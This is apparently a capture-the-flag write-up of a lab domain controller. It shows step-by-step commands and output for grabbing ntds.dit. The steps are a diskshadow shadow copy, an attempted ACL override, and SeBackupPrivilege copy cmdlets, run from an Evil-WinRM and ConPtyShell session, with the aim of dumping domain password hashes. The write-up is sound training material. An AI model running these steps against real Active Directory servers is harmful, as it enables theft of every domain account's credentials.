# Grabbing ntds.dit with diskshadow

[diskshadow](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/) can be used to get ntds.dit To avoid using script mode I first had to check we could use [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) which requires Windows 10 / Server 2019 build 1809 at least, a very recent Windows build. We can't run systeminfo but an alternate PS command tells us

```text
*Evil-WinRM* PS C:\Users\svc_backup\Documents> systeminfo
Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1
+ systeminfo
+ ~~~~~~~~~~.
At line:1 char:1
+ systeminfo
+ ~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
*Evil-WinRM* PS C:\Users\svc_backup\Documents> Get-ComputerInfo


WindowsBuildLabEx                                       : 17763.1.amd64fre.rs5_release.180914-1434
WindowsCurrentVersion                                   : 6.3
WindowsEditionId                                        : ServerStandard
WindowsInstallationType                                 : Server
WindowsInstallDateFromRegistry                          : 2/1/2020 7:04:40 PM
WindowsProductId                                        : 00429-00521-62775-AA435
WindowsProductName                                      : Windows Server 2019 Standard
WindowsRegisteredOrganization                           :
WindowsRegisteredOwner                                  : Windows User
WindowsSystemRoot                                       : C:\Windows
WindowsVersion                                          : 1809
BiosCharacteristics                                     :
BiosBIOSVersion                                         :
BiosBuildNumber                                         :
BiosCaption                                             :
BiosCodeSet                                             :
BiosCurrentLanguage                                     :
BiosDescription                                         :
BiosEmbeddedControllerMajorVersion                      :
BiosEmbeddedControllerMinorVersion                      :
BiosFirmwareType                                        :
BiosIdentificationCode                                  :
BiosInstallableLanguages                                :
BiosInstallDate                                         :
BiosLanguageEdition                                     :
BiosListOfLanguages                                     :
BiosManufacturer                                        :
BiosName                                                :
BiosOtherTargetOS                                       :
BiosPrimaryBIOS                                         :
BiosReleaseDate                                         :
BiosSeralNumber                                         :
BiosSMBIOSBIOSVersion                                   :
BiosSMBIOSMajorVersion                                  :
BiosSMBIOSMinorVersion                                  :
BiosSMBIOSPresent                                       :
BiosSoftwareElementState                                :
BiosStatus                                              :
BiosSystemBiosMajorVersion                              :
BiosSystemBiosMinorVersion                              :
BiosTargetOperatingSystem                               :
BiosVersion                                             :
CsAdminPasswordStatus                                   :
CsAutomaticManagedPagefile                              :
CsAutomaticResetBootOption                              :
CsAutomaticResetCapability                              :
CsBootOptionOnLimit                                     :
CsBootOptionOnWatchDog                                  :
CsBootROMSupported                                      :
CsBootStatus                                            :
CsBootupState                                           :
CsCaption                                               :
CsChassisBootupState                                    :
CsChassisSKUNumber                                      :
CsCurrentTimeZone                                       :
CsDaylightInEffect                                      :
CsDescription                                           :
CsDNSHostName                                           :
CsDomain                                                :
CsDomainRole                                            :
CsEnableDaylightSavingsTime                             :
CsFrontPanelResetStatus                                 :
CsHypervisorPresent                                     :
CsInfraredSupported                                     :
CsInitialLoadInfo                                       :
CsInstallDate                                           :
CsKeyboardPasswordStatus                                :
CsLastLoadInfo                                          :
CsManufacturer                                          :
CsModel                                                 :
CsName                                                  :
CsNetworkAdapters                                       :
CsNetworkServerModeEnabled                              :
CsNumberOfLogicalProcessors                             :
CsNumberOfProcessors                                    :
CsProcessors                                            :
CsOEMStringArray                                        :
CsPartOfDomain                                          :
CsPauseAfterReset                                       :
CsPCSystemType                                          :
CsPCSystemTypeEx                                        :
CsPowerManagementCapabilities                           :
CsPowerManagementSupported                              :
CsPowerOnPasswordStatus                                 :
CsPowerState                                            :
CsPowerSupplyState                                      :
CsPrimaryOwnerContact                                   :
CsPrimaryOwnerName                                      :
CsResetCapability                                       :
CsResetCount                                            :
CsResetLimit                                            :
CsRoles                                                 :
CsStatus                                                :
CsSupportContactDescription                             :
CsSystemFamily                                          :
CsSystemSKUNumber                                       :
CsSystemType                                            :
CsThermalState                                          :
CsTotalPhysicalMemory                                   :
CsPhyicallyInstalledMemory                              :
CsUserName                                              :
CsWakeUpType                                            :
CsWorkgroup                                             :
OsName                                                  :
OsType                                                  :
OsOperatingSystemSKU                                    :
OsVersion                                               :
OsCSDVersion                                            :
OsBuildNumber                                           :
OsHotFixes                                              :
OsBootDevice                                            :
OsSystemDevice                                          :
OsSystemDirectory                                       :
OsSystemDrive                                           :
OsWindowsDirectory                                      :
OsCountryCode                                           :
OsCurrentTimeZone                                       :
OsLocaleID                                              :
OsLocale                                                :
OsLocalDateTime                                         :
OsLastBootUpTime                                        :
OsUptime                                                :
OsBuildType                                             :
OsCodeSet                                               :
OsDataExecutionPreventionAvailable                      :
OsDataExecutionPrevention32BitApplications              :
OsDataExecutionPreventionDrivers                        :
OsDataExecutionPreventionSupportPolicy                  :
OsDebug                                                 :
OsDistributed                                           :
OsEncryptionLevel                                       :
OsForegroundApplicationBoost                            :
OsTotalVisibleMemorySize                                :
OsFreePhysicalMemory                                    :
OsTotalVirtualMemorySize                                :
OsFreeVirtualMemory                                     :
OsInUseVirtualMemory                                    :
OsTotalSwapSpaceSize                                    :
OsSizeStoredInPagingFiles                               :
OsFreeSpaceInPagingFiles                                :
OsPagingFiles                                           :
OsHardwareAbstractionLayer                              :
OsInstallDate                                           :
OsManufacturer                                          :
OsMaxNumberOfProcesses                                  :
OsMaxProcessMemorySize                                  :
OsMuiLanguages                                          :
OsNumberOfLicensedUsers                                 :
OsNumberOfProcesses                                     :
OsNumberOfUsers                                         :
OsOrganization                                          :
OsArchitecture                                          :
OsLanguage                                              :
OsProductSuites                                         :
OsOtherTypeDescription                                  :
OsPAEEnabled                                            :
OsPortableOperatingSystem                               :
OsPrimary                                               :
OsProductType                                           :
OsRegisteredUser                                        :
OsSerialNumber                                          :
OsServicePackMajorVersion                               :
OsServicePackMinorVersion                               :
OsStatus                                                :
OsSuites                                                :
OsServerLevel                                           : FullServer
KeyboardLayout                                          :
TimeZone                                                : (UTC-08:00) Pacific Time (US & Canada)
LogonServer                                             :
PowerPlatformRole                                       : Desktop
HyperVisorPresent                                       :
HyperVRequirementDataExecutionPreventionAvailable       :
HyperVRequirementSecondLevelAddressTranslation          :
HyperVRequirementVirtualizationFirmwareEnabled          :
HyperVRequirementVMMonitorModeExtensions                :
DeviceGuardSmartStatus                                  : Off
DeviceGuardRequiredSecurityProperties                   :
DeviceGuardAvailableSecurityProperties                  :
DeviceGuardSecurityServicesConfigured                   :
DeviceGuardSecurityServicesRunning                      :
DeviceGuardCodeIntegrityPolicyEnforcementStatus         :
DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus :
```

I used Method 2 of ConPtyShell to get an interactive session. It's amazing to see that even progress bars show up while PS is doing something and pscp64.exe now works together with tab-completion and up-arrow history. Now we just follow what pentestlab.blog says

```text
PS C:\Temp> C:\Windows\System32\diskshadow.exe
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC01,  4/13/2021 5:07:57 PM


DISKSHADOW> set context persistent nowriters

DISKSHADOW> add volume c: alias someAlias

DISKSHADOW> create
Alias someAlias for shadow ID {5990100b-b517-4dc1-8c51-68a845698eda} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {26c7b82f-13a4-4dbe-be2e-bbedaff03b19} set as environment variable.

Querying all shadow copies with the shadow copy set ID {26c7b82f-13a4-4dbe-be2e-bbedaff03b19}

                - Shadow copy set: {26c7b82f-13a4-4dbe-be2e-bbedaff03b19}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{351b4712-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 4/13/2021 5:08:20 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
                - Originating machine: DC01.BLACKFIELD.local
                - Service machine: DC01.BLACKFIELD.local
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential
Number of shadow copies listed: 1

DISKSHADOW> expose %someAlias% z:
-> %someAlias% = {5990100b-b517-4dc1-8c51-68a845698eda}
The shadow copy was successfully exposed as z:\.

DISKSHADOW> exec "cmd.exe" /c copy Z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit

The script file name is not valid.

EXEC <file.cmd>
        Execute a script file on the local machine.
        This command is used to duplicate or restore data as part of
        a backup or restore sequence.

DISKSHADOW> exit

PS C:\Temp> dir Z:\Windows\NTDS\ntds.dit


    Directory: Z:\Windows\NTDS


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/13/2021   4:48 PM       18874368 ntds.dit
```

Unfortunately we still can't copy it nor change its ACL

```text
PS C:\Temp> copy Z:\Windows\NTDS\ntds.dit .
copy : Access to the path 'Z:\Windows\NTDS\ntds.dit' is denied.
At line:1 char:1
+ copy Z:\Windows\NTDS\ntds.dit .
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (Z:\Windows\NTDS\ntds.dit:FileInfo) [Copy-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
    
PS C:\Temp> Import-Module .\Acl-FullControl.ps1
PS C:\Temp> Acl-FullControl -user blackfield.local\svc_backup -path Z:\Windows\NTDS\ntds.dit
[+] Current permissions:


Path   : Microsoft.PowerShell.Core\FileSystem::Z:\Windows\NTDS\ntds.dit
Owner  : BUILTIN\Administrators
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)



Exception calling "AddAccessRule" with "1" argument(s): "No flags can be set.
Parameter name: inheritanceFlags"
At C:\Temp\Acl-FullControl.ps1:27 char:1
+ $acl.AddAccessRule($permisoacl)
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : ArgumentException
+ set-acl -Path $path -AclObject $acl
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (Z:\Windows\NTDS\ntds.dit:String) [Set-Acl], InvalidOperationException
    + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.PowerShell.Commands.SetAclCommand

[+] Acls changed successfully.


Path   : Microsoft.PowerShell.Core\FileSystem::Z:\Windows\NTDS\ntds.dit
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Sddl   : O:BAG:SYD:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)

PS C:\Temp> copy Z:\Windows\NTDS\ntds.dit .
copy : Access to the path 'Z:\Windows\NTDS\ntds.dit' is denied.
At line:1 char:1
+ copy Z:\Windows\NTDS\ntds.dit .
    + CategoryInfo          : PermissionDenied: (Z:\Windows\NTDS\ntds.dit:FileInfo) [Copy-Item], UnauthorizedAccessException
    + FullyQualifiedErrorId : CopyFileInfoItemUnauthorizedAccessError,Microsoft.PowerShell.Commands.CopyItemCommand
```

We have to use our other SeBackupPrivilege and [these DLLs](https://github.com/giuliano108/SeBackupPrivilege)

```text
PS C:\Temp> Import-Module .\SeBackupPrivilegeCmdLets.dll
PS C:\Temp> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\Temp> Get-SeBackupPrivilege
SeBackupPrivilege is enabled
PS C:\Temp> Copy-FileSeBackupPrivilege Z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
Copied 18874368 bytes
```

Now we can copy ntds.dit back to Kali and dump hashes.